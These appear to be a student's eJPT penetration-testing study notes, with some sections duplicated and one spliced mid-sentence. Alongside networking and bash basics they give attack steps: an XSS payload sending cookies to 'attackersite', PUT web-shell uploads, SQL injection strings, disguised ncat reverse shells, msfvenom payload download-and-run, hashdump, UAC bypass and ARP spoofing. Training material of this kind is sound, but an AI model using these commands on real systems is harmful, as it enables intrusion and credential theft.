@@ -1,0 +1,820 @@
+
+Packet Structure:-
+Header-Contain addresses
+Payload-Actual information
+
+IPv4-4 octets
+Reserved ipv4 addresses:-
+0.0.0.0-0.255.255.255 - Starting and ending addresses of network
+127.0.0.0-127.255.255.255-IP addresses depicting localhost(your system)
+192.168.0.0-192.168.255.255-Private IP's
+
+Router-Devices to forwarding packet, frames (depending on layer used)from one node to another
+Routing-Collection of networks
+Routing protocols are used for the same
+Routing protocols check for the shortest path between source and destination, for travel
+
+Inspection of destination addresses is done by the router,then sends the packet to appropriate network
+
+Routing Table-Contains information of destination, interface, etc.
+Default entry in Routing Table-0.0.0.0 - For a packet, whose destination is an unknown network
+
+Default interface in routing table-Say an interface is receiving a packet, for a specific address. The router table has configured a default interface. So if no addresses in the table match with the destination address of the packet, the default interface receives the packet
+
+arp -a 
+
+Data Link layer
+
+Data is known as frames
+Hubs and switches forward them
+They use MAC Addresses for reference
+
+
+netcat doesn't support HTTPS Connections
+
+Web Applications:-
+
+HTTP works over TCP and is stateless
+
+User Agent-Browser being used to perform connection request
+
+What do youCleartext protocol-HTTP
+Not usable on website transmitting sensitive information
+
+WireShark-For packet sniffing
+
+We can start packet capture, examine packets, etc.
+
+Scenario 1 Log on to a website following HTTP protocol
+We are logging in, using our credentials, which is sensitive info
+
+Packets are programmed to capture packets, before the logging process.
+
+When we view the packets, after performing a login attempt, we can view the credential information, by examining the packet
+
+Right click on packet ->Follow->Tcp stream 
+For an HTTP protocol website,(Packet is green)-the data will be visible in cleartext
+For HTTPS,(Black packet)-it will be in an incomprehensible form, as it is encrypted
+
+Packet Structure:-
+Header-Contain addresses
+Payload-Actual information
+
+IPv4-4 octets
+Reserved ipv4 addresses:-
+0.0.0.0-0.255.255.255 - Starting and ending addresses of network
+127.0.0.0-127.255.255.255-IP addresses depicting localhost(your system)
+192.168.0.0-192.168.255.255-Private IP's
+
+Router-Devices to forwarding packets, frames (depending on layer used)from one node to another
+Routing-Collection of networks
+Routing protocols are used for the same
+Routing protocols check for the shortest path between source and destination, for travel
+
+Inspection of destination addresses is done by the router, then sends the packet to the appropriate network
+
+Routing Table-Contains information of destination, interface, etc.
+Default entry in Routing Table-0.0.0.0 - For a packet, whose destination is an unknown network
+
+Default interface in routing table-Say an interface is receiving a packet, for a specific address. The router table has configured a default interface. So if no addresses in the table match with the destination address of the packet, the default interface receives the packet
+
+arp -a 
+
+Data Link layer
+
+Data is known as frames
+Hubs and switches forward them
+They use MAC Addresses for reference
+ have in a request packet
+
+- Type of request,with protocol version - GET,POST etc  / HTTP/1.1
+- Host - Hostname being requested
+- Accept - Type of document being expected (txt,html forms)
+- Accept Language - Human Language (/en_en/)
+- Acccept Encoding - Two typesof compression - gzip and deflate
+- Connection = Either keep_alive (sustain) or die
+
+Performing packet analysis for HTTP - Netcat and Burpsuite(Repeater tool)
+
+
+For netcat - Command - netcat -v <domain name >  <port> -Here 80
+
+HTTPS Packet Analysis -We use OpenSSL
+
+Command - openssl s_client -connect <domain name>:443
+
+
+Cookies
+
+-Stored in the cookie jar of  a website -Different for different websites
+
+Format:-
+
+Cookie Content
+Expiration Date - Cookie can only be used up to this date
+Path
+Domain 
+Flag-setting attributes -Examples - HttpOnly ,Secure etc
+
+If set a path ->The cookie also applies to /mainpath/subpath1/subpath2/and so on
+
+
+Session - storing a record between C-S communication
+- Has a session and token id
+- This session data is stored on the server-side
+-When you close a website login, the cookie for that website will be deleted immediately
+
+Same Origin Policy -Simply states that JavaScript used on a website, cannot be used from a different origin -Or else causes client information stealing
+
+
+Burpsuite
+
+Spider-Crawl over the website.Especially if you don't know the website's layout or architecture
+
+To backdoor a Linux Account, you need the following files:-
+~/.bashrc
+~/.bash_profile   -Allow to set the environment properly
+~/.bash_logout
+
+Environment variables 
+Command- env
+
+Some variables:-
+PATH - echo $PATH- To find the path for executable files
+
+Command - burp suite
+PATH variable will look around the system, for executable files of the 'burpsuite' command. Eventually, it finds it in the /usr/bin path and will load the executable file for us
+
+If I type in - burp suite - PATH variable will return "brpsuite: Command not found"
+
+TO find a command's location - 'which command
+
+To find chmod's location - which chmod -
+Returns the location
+
+Bash symbols:-
+
+* - used in rm file*
+| (pipe) - Chain two or more commands
+>> - Move output to a file 
+
+
+.sh - Executable bash file
+Always start a bash script using #!/bin/bash
+
+Bash conditional statements
+
+if <condition>;then  <-If statement
+<comands>
+fi
+
+Else and Elif commands
+
+if (condition);then
+<command>
+
+elif (command);then
+<next command>
+
+else
+<another command>
+fi
+
+Arithmetic conditional operators:-
+
+-eq - Equal
+-ne  Not equal
+-lt -Less than
+-le -Less than or equal to
+-gt- Greater than
+-ge-Greater than or equal to
+
+Declaring variables:-
+
+x=<number>
+y="<string>"  <-Same as python
+
+Simple bash program to check if two numbers are equal
+
+#!/bin/bash
+
+x=3
+y=4
+
+if ["$a" -eq "$b"];then
+echo "They are equal";
+fi
+
+Bash conditional statements
+
+i)For loop  -Program to loop and print all items in a directory
+
+#!/bin/bash
+for i in $(ls);do
+echo item;$i
+done
+
+Looping over numbers
+
+#!/bin/bash
+for i in `seq 1 10`;
+do
+echo $i
+done
+
+While loop - One liner commands
+
+Eg)while read line;do echo $line; done < file.txt
+
+Windows Command line:-
+
+Commands- del,move,dir etc
+In Windows, directories point towards \
+In Linux, directories point towards /
+
+Accessing Windows variables:-
+
+echo %PATH% - Provides path of executables
+echo %us
+ername%- Provides username of the current user
+-You can create variables of your own. These stay temporarily, in the current cmd window
+
+Output generation echo <command> >> <filename>
+type <filename> - View contents of a file
+
+Command chaining:-
+command 1 & command2 - Execute 100%,without regard of result
+command 1 && command 2 - If executed 1'st,execute second.Else fail
+
+command 1 | command2 - Execute 100%,without regard of result
+command 1 || command 2 - If executed 1'st,execute second.Else fail
+
+Conditional statements
+
+-Example using setting up an environmental variable
+
+set a variable - set y=2
+
+if %y%==2 (echo false) ->returns false
+if %y%==2 (echo false) ->returns true
+
+if %y%==4 (echo false) ->Doesnt return anything
+if %y%==4 (echo true) ->Doesnt return anything
+------------------------------------------------------------------
+Penetration Testing Basics
+
+Information given out by employees - emails, phone numbers, and plans - Helps an attacker to build the technical mapping of an organization
+
+LinkedIn - Has advanced search features - narrow professional profiles down
+
+If you are targetting an ad agency, your target - Instagram
+
+Other methods of OSINT:-
+whois lookup
+crunch database
+Target organization's website
+Government websites
+Hunting down employee emails (following a specific pattern)
+firstname.surname@organization.com - Using G+ Suite
+firstletter.surname@organization.com
+
+These are called schemas
+-Helping out hackers-Address doesn't exist -after sending an email
+-Narrow down your schema formats
+-Mail them with something catchy, that makes them open the mail
+
+Subdomain Enumeration tools:-
+-Sublist3r
+-dnsdumpster - Google tool
+Google Dorks
+crt.sh
+-Amass
+
+REMEMBER: WHY DO WE DO THIS? -An attacker always wants to broaden the attack surface. Enumerate as much as possible
+
+Mapping a network
+-You won't always get a fixed target address
+-Sometimes a block of 65536 addresses. How do find which machine is assigned to which IP?
+
+MAP A NETWORK - YOU DON'T KNOW WHAT IP HOSTS ARE PRESENT
+
+How does a mapper know whether a port or a host is up/open?-By performing a ping across it
+
+Tools:-
+
+Use fping
+-fping  Command- fping -a -g <IP Range> Eg-10.10.10.10 (single)
+                      or
+                                            10.10.10.0/24 (range)
+
+Use Nmap
+Command  -  nmap -sN <subnet> 10.10.10.0/24
+
+Switches - -a = show alive hosts
+-g - Ping sweep, instead of a standard ping test
+
+-Nmap scan, with a -sN switch (ping scan) - for both single and range
+
+OS Fingerprinting
+-Nmap, using -O switch (OS Detection)
+
+Nmap port scanning
+-sT - 3-way handshake - SYN   SYN+ACK   ACK
+-sS  -Stealthy scan - Only sends SYN Packet
+Target machine returns:-
+RST - For closed ports
+ACK - For open ports
+-Pn - Ping ports 
+-sU - UDP Scan
+-sV - Service version scan
+
+
+Larger Network surface of target - more likely to have a firewall in place
+
+Firewalls in place:-
+Not able to determine open or close ports
+No clarity in-service version detection of a target (machine type), same goes for a port (service version of service existing on a port)
+
+-Masscan - Faster than Nmap, but less accurate
+
+-Know the need of your customer -Might ask for a full pentest or a simple vulnerability assessment over their network(Just use a vulnerability scanner, or tools with --vuln find switches)
+-Examples - Nessus, OpenVAS, Nexpose, and GFI LAN Gaurd
+
+Custom Application Testing - Not some official regular software
+-You have to manually test it.
+-Understand its functionality, reverse engineer it's working, etc
+
+
+Steps of a Nessus scan:-
+-Port Scan
+-Service Detection on ports
+-Vulnerability check, on ports, with lookups on vulnerability databases, for verification
+-Probe - To remove false positives 
+
+Website Enumeration - For eJPT 
+whois <domain>
+or
+whois <IP>
+
+Web Server Fingerprinting
+
+Banner Grabbing and manually powered tools - httprint and netcat
+
+Netcat example - You want to find the server and its version 
+
+Command-nc <IP/Domain Name> 80
+Then enter - HEAD / HTTP/1.0 ->Press 'enter' button two times
+
+
+httprint example             (I Prefer httprint.Use this)
+Command - httprint -P0 -h <IP> -s /usrshare/httprint/signatures.txt
+
+Switch meaning - P0 -Avoid pinging the web host
+-s -Use signature file from httprint
+or
+
+curl -i -X -h http://<IP> - It works
+Banner Grabbing for Https web servers (It works)
+Tool - OpenSSL
+Command-openssl s_client -connect <domain name>:443
+Then type HEAD / HTTP/1.0
+
+CHECK WHICH HTTP VERBS ARE AVAILABLE ON THE SERVER -using netcat
+------------------------------------------------------------------
+I use cURL
+Command - curl -i -X OPTIONS http://<IP>
+
+Shows the allowed options like Allow:
+
+You can also use nikto 
+Command - nikto -h HTTP://<IP>
+--------------------------------------------------------------------
+nc 10.10.10.10 80
+OPTIONS / HTTP/1.0
+--------------------------------------------------------------------
+GET - Get resource (I use cURL)
+
+Command - curl -i -X GET http://<IP>/path/to.txt/or/.php/page
+--------------------------------------------------------------------
+GET /<page>.php / HTTP/1.1    page.php(singular webpage) and not the
+domain name
+--------------------------------------------------------------------
+I prefer using curl
+Command - curl -i -X GET http://<IP>/path/filetoget
+-------------------------------------------------------------------
+Host: <domain name>.com
+
+You can also pass arguments to the GET verb
+Example -  Pass argument course=Pentest to INE
+Command - GET <INE.com>?course=Pentest HTTP/1.1
+Host: www.INE.com
+
+POST - Submit some input data into a web form
+
+POST <page>.php / HTTP/1.1
+Host:<domain>com
+
+log=admin&pass=admin
+
+HEAD-Only receive page header and no body content
+
+HEAD <page>.php  / HTTP/1.1
+Host:<domain>.com
+
+PUT - Upload a file, onto a server - similar to FTP command
+-------------------------------------------------------------------
+I prefer using curl
+Commmand - curl -i -X PUT http://<IP>/path/filetoupload
+--------------------------------------------------------------------
+PUT /wp-uploads.php/ / HTTP/1.1
+Host: <domain>.com
+
+<PUT file_to_insert>
+
+DELETE - To delete resources from the webserver
+
+DELETE /page.php / HTTP/1.1
+Host:<domain>.php
+
+OPTIONS - Query the webserver for enabled HTTP verbs on the server. Find what verbs are permissible to use on the server
+
+OPTIONS / HTTP/1.1
+Host:<domain>.php 
+
+REST API - Representational State Transfer Application Programming Interface - These API's can "PUT" files on the server
+
+
+Enumerating options on a web server
+-You can use cURL
+-You can use netcat too - Command - nc <domain>.com 80
+then type -  OPTIONS / HTTP/1.1 -Returns the verbs/options you can do to the server
+
+Exploiting PUT
+Why? - To upload shells on the server
+
+Constraints - Size of payload - 
+Command to find size - wc -m <payload/shell>.php
+Then enter x <payloadname>.php
+
+Then put the shell onto the server
+PUT /path / HTTP/1.1                     nc <domain>.com 80
+Host:<domain>.php              or
+
+PUT /<file>                               PUT /<shell>.php HTTP/1.0
+
+After uploading shell - Go to path of the uploaded shell
+?cmd= <your command>
+
+
+Google Hacking
+
+
+site: Only belonging to a particular company
+intitle: Look for specific words on the website title
+inurl: Specific words in the URL address of the website
+filetype: Hunt down .pdf,.xlsx, type files
+AND, OR - 
+-(symbol)  - To filter some keywords
+
+XSS
+-Steal session data
+-Inject malicious code to person browsing site
+-Attacker can control compromised web servers and sessions of users
+-Points for vulnerability and malicious code injection-GET Parameters, cookies, POST parameters, and all use input parameters
+
+Types:-
+
+Reflected - Malicious Code is injected on the URL of the website. When clicked and redirected, XSS Attack takes place
+
+Persistent - Code is sent to the vulnerable web server and then stored by the server. When asked to load the page, the payload will perform the XSS on the visitor
+
+-Persistent = Present all the time, when a particular injected page is loaded
+
+How to get cookies - use <script>alert(document.cookie)</script>
+-In a comment field ,search field or post field - Only returns your cookies
+
+Otheer methods of XSS:-
+Reflective - <script><h2>Hi</h2></script> -Enter this in a comment field or search fields- If the comment is not sanitized, you will get a big HI comment
+
+Another method - <script>alert("XSS!")</script> -Again on user comment area or search field
+
+Another method - \<script> alert(\'XSS\') \</script> - In search bar
+---------------------------------------------------------------------
+To print your Session Cookie-ID - Infecting Feedback form
+
+We have 2 methods:-
+
+1)Infect Feedback form
+For this task, we require a specific webpage, within the website, to store the cookies. Fortunately, INE has just done that, giving us
+192.168.99.11/get.php
+
+We also have a jar.txt file at the same IP, to store cookie id's
+
+First, let's infect the Feedback form with the cookie stealing script
+
+As in - Image X6
+
+Now, we wait on http://192.168.99.11/jar.txt and get - Image X6 (1)
+---------------------------------------------------------------------
+2)Infect the comment field on the blog page
+
+Enter comment - Nice Post <script> var i =New Image(): i.src="http://attackersite/get.php?cookie="+(document.cookie)"</script>
+
+Click on POST and wait at the jar.txt page
+We get the cookie ID
+---------------------------------------------------------------------
+Now, we need to change the current cookie id and set it to the captured admin's one.
+
+Open Firebug - Go to cookies tab -Image X7
+On the id field under Value, let's right-click and click on paste
+It will open up - Image X7 (1)
+
+Copy, paste and click Ok
+We are now authenticated as Admin
+---------------------------------------------------------------------
+
+For stealing other users cookies, we cannot show the alert box to alert that a person's cookie id has been stolen
+
+Stolen cookie ID will be stored back in a .jar file, hosted somewhere else, which is used by an attacker to log in as another user
+
+Insert the grabbed cookie into firebug(in insert cookie field) and reload the page, to log in as someone else.
+---------------------------------------------------------------------
+XSS - General steps to find and test
+1)Find reflection point
+2)Test, with a tag
+3)Test with HTML/Javascript code - (alert('XSS'))
+---------------------------------------------------------------------
+
+Two SQL Injection tests
+id <-If it is a parameter /or test using other available parameters
+
+?id=1' or 1=1; -- -              OR operator (if injection exists and the parameter is vulnerable, at least one of the injection commands will be executed, giving us a SQL Error message (IF AND ONLY IF THE PARAMETER IS VULNERABLE)) 
+
+?id=1' or 1=2; -- - -Gives a normal page back,because 1==2 condition is false and confirms SQL Injection is triggered,when conditions are neccesarily true)
+
+Try the tests on sqlmap and search bar
+
+
+SQL Testing technique -  --technique=(Union)
+Enumerate users -  -users
+
+Other important switches -  -D - database
+-T - Tables  -C -Columns you want to view
+(when not using --dump-all switch)
+
+
+-Burp intercept proxy for login ->send the packet to Intruder, try meddling with the user and password parameters, using '
+
+Like  user=a'  (Turn off proxy, then forward the packet, to view if you get SQL Error or not) 
+Then try                   user=a' or 1=1; -- -
+
+Try for admin then try for password - Total 4 tries, to experiment, meddle and forward, to view response tab
+
+Malware:-
+
+Backdoor software used by pentesters-NetBus and SubSeven - use the backdoor to gain access and view data on the remote machine
+
+Types:-
+Trojan Horse
+Bootkit - Trap your Boot up sequence and make changes to it
+Greyware - Spyware + Adware +combination of both
+Spyware
+Adware
+Keylogger
+Ransomware
+Rootkits - hide behind system processes, doesn't do noticeable work
+
+For experiments, we can use ncat
+-Download ncat on the target machine ->Rename installation file like to 'winconfig'
+
+-Go to the folder, where the winconfig.exe(i.e ncat is located)
+- Run it - winconfig -l -p 5555 -e cmd.exe
+
+From attacker's machine -  Run - ncat <Victim IP> 5555
+
+
+If you want to listen from attacker machine:-
+
+On target machine - winconfig -e cmd.exe <Attacker IP> 5555
+
+On Attacker machine - Run - nc-lvp 5555
+
+Backdoors are possible to set up on Metasploit,using
+exploit /multi/handler and setting payload to /windows/meterpreter/reverse_tcp
+
+IMPORTANT: METASPLOIT 'S METERPRETER PROMPT ALLOWS YOU TO DOWNLOAD FILES
+
+Perform - cd /directory  - traverse to the directory you want
+MAKE SURE YOU ARE IN THE DIRECTORY FROM WHICH YOU WANT TO DOWNLOAD THE FILE
+
+Command for download - download <file name> /root/ <-Download path to your machine
+
+Also to upload files - Meterpreter> upload <filename>
+
+Hashcat command syntax
+hashcat -m <check what type of hash it is> -a <type mode> Hash file 
+
+or
+
+hashcat -m <check what type of hash it is> -a <type mode> Hash file /wordlist/file
+
+
+Password Attacks 
+1)unshadow
+
+unshadow /etc/passwd shadow > unshadow
+
+2)JohnTheRipper
+
+Command - john -wordlist=/path/to/wordlist -users=users.txt hashfile
+
+users.txt - Stores usernames
+hashfile - Stores password  hashes found in /etc/passwd or /etc/shadow
+
+
+
+
+
+------------------------------------------------------------------
+Null Shares-Exploitable element of Windows (Either on the host you are pentesting or find on Legacy systems)
+
+-Once properly exploited, you get info about system users, groups,passwords, and running processes
+
+NETBIOS-SSN Enumeration tool on Windows
+Command to find and enumerate a Windows machine - nbtstat -A <IP>(RUN ON WINDOWS MACHINE, AFTER GAINING ACCESS TO IT)
+
+Now to enumerate the shares,
+
+smbclient -L //<IP> -U ""
+
+smbclient //<IP>/Share Name
+
+Command - NET VIEW <IP>
+
+NETBIOS-SSN Enumeration tool on Linux
+-smbclient
+-enum4linux
+-nmblookup -     nmblookup -A <IP>
+
+How to check for null sessions? - We target the IPC$ share, with empty credential fields (ON WINDOWS MACHINE)
+
+Command - net use \\<IP>\IPC$ '' /u:'' (ON WINDOWS MACHINE)
+If vulnerable, we gain access and the command was executed successfully
+
+Checking the same,ON A LINUX MACHINE ,using SMBCLIENT
+Command - smbclient //<IP>/IPC$ -N
+
+Check the same, for C$ share
+
+-Another tool to exploit Null sessions - winfo -download from packetstorm
+
+Syntax - winfo <IP> -n
+
+-Another tool - samrdump.py from /impacket
+Syntax - python3 samrdump.py <IP>
+
+More learning lessons - use --script=smb-brute and smb*
+
+ARP Poisoning - Intercept and manipulate network traffic
+
+ARP-Maps IP to MAC Address
+- When sending packets, a computer makes use of both addresses
+- Once MAC address resolution is complete, the destination address is stored in the ARP Cache table
+
+Performing ARP Spoofing on Linux
+
+-We use Dsniff tool for this.
+Before running dsniff, we need to enable the Linux Kernel IP Forwarding - to enable Linux box into a router
+Why? To tell your machine,to forward the intercepted packets, to the destination/target machine 
+
+Commands:-  
+
+First, open up your Wireshark and set it ip.addr == <to victim machine's IP Address>
+
+echo 1 > /proc/sys/net/ipv4/ip_forward   - To turn packet forwarding on
+
+arpspoof -i tap0 -t <Attacker IP> -r <Target IP>
+View the intercepted packets and traffic on Wireshark
+
+
+-MITM Attack possibility - ARP Cache tables of two hosts performing communication are infiltrated,then the attacker can sniff and monitor communication
+-This attack is performed using gratious ARP replies
+-Gratious ARP replies - Attacker sends reply, without waiting for the recipient to perform a request
+
+Modus Operandi:-
+- ARP message is sent by the attacker to all hosts on a network(that a particular host/IP can be reached, by using the MAC address available at the attacker's machine)
+
+-As soon as the ARP cache table contains false information, every communication between poisoned nodes will be sent to the attacker's machine
+
+-Attacker can prevent the poisoned entry from the ARP table from expiring, by sending a gratious ARP reply every 30s
+
+-Once the attacker receives the communication packets, it needs to forward them to the correct destination
+
+ARP Spoofing tool-DSniff Arpspoof(Setup and working is explained)
+
+To perform an ARP Spoofing attack, you need
+Wireshark and ARPSpoof tool
+
+Start Wireshark, keep running in backgrounf
+First step - Enable forwarding of IP packets to target
+Command- echo 1 > /[roc/sys/net/ipv4/ip_forward
+
+Next,perform a spoofing attack
+Command- arpspoof -i eth0 -t <Source/Attacker IP> -r <Target IP>
+
+
+eth0-running both machines on an ethernet interface
+Then, run/do some operations on the target, on a login page, or accessing network shares
+
+Wireshark captures traffic on the background 
+
+If you have generated HTTP traffic, then filter Wireshark traffic by 'HTTP
+Click on the Export option on Wireshark. You will see the uploads/downloads done on the HTTP Server
+-Click on 'save as'.Go to your terminal and you will be able to access the file uploaded/downloaded from the target machine, on your machine
+
+Very important - show payloads - when inside an exploit
+
+Meterpreter:=
+
+getsystem command - Usable on Windows-based machines, to escalate privileges. ONLY WHEN ROOTING WINDOWS BOXES
+
+Command - meterpreter>   getsystem - Privilege escalate
+
+If it doesn't work? Why? -Because User Account Control Policy prevents privilege escalation
+ERROR MESSAGE YOU GET priv_elevate_getsystem: Operation failed: The environment is incorrect.
+
+Now check if the current user has UAC enabled. From the meterpreter prompt, run
+
+Command - run post/windows/gather/win_privs 
+
+IF UAC enabled = true, you need to bypass it
+
+How to bypass?
+use exploit/windows/local/bypassuac 
+
+(Remember to have a session already open, after successfully running the exploit, on the vulnerable component, using Metasploit's exploits. MAKE SURE YOU HAVE THE METERPRETER> PROMPT)
+.How do you do that? - Command - background - Sets session 1 aside and helps you start a new one.
+
+-Show options
+
+Set the session ID of that session and exploit - Allows you to bypass User Account Control
+
+Then perform the 'getsystem' command on the meterpreter prompt
+
+Dumping password database -utility of meterpreter shell
+ONLY USABLE WHILE ROOTING WINDOWS MACHINES
+
+- Create a session(for the vulnerability, on Metasploit). Set options, exploit it, and make sure you get the meterpreter> prompt
+
+-Command = background - Sets this session on the background and helps start a new one
+
+use post/windows/gather/hashdump
+-Show options
+- set the session id of the session you just set to the background
+-exploit
+
+
+Other commands:-
+
+background - Background the current session
+sessions -l
+sessions -i <number>
+sysinfo
+ifconfig
+route
+getuid
+download files 
+upload files
+shell
+
+cURL -utility to download files, from a web shell, which is vulnerable and responsive
+
+Usage - Either after ? or enter into the whitespace offered by a web shell
+
+Command - curl http://<IP>:<port> /path/of/file/to/download -T  /path/to/store/in
+
+MAKE SURE TO HAVE YOUR NETCAT LISTENER READY ON THE PORT
+
+Creating a payload, using  msfvenom - for listener
+Command-msfvenom -p linux/x64/shell_reverse_tcp lhost=  lport= -f elf -o <name of file you want to save as>
+
+
+
+Upload and save it on the target's machine
+
+First, start the SimpleHTTPServer on port 80
+On the browser- Command-curl http://<YourIP>:80/shellfile -o /directory/on/target/to/save/on
+Change permissions, to make it executable
+
+Command = chmod 700 /directory/of/target/where/thefile/is/saved
+
+Now set your netcat to listener mode - nc -lvp 4444
+
+Now go to the browser and just type the directory/path/of/uploaded/script file
+
+Why? - We already set the IP and port to listen on, in the msf payload. So just set your netcat to listen on the same port, while
+entering the uploaded shell path on the web shell
+
+Two ways to upgrade your shell
+
+bash -i or python one=liner
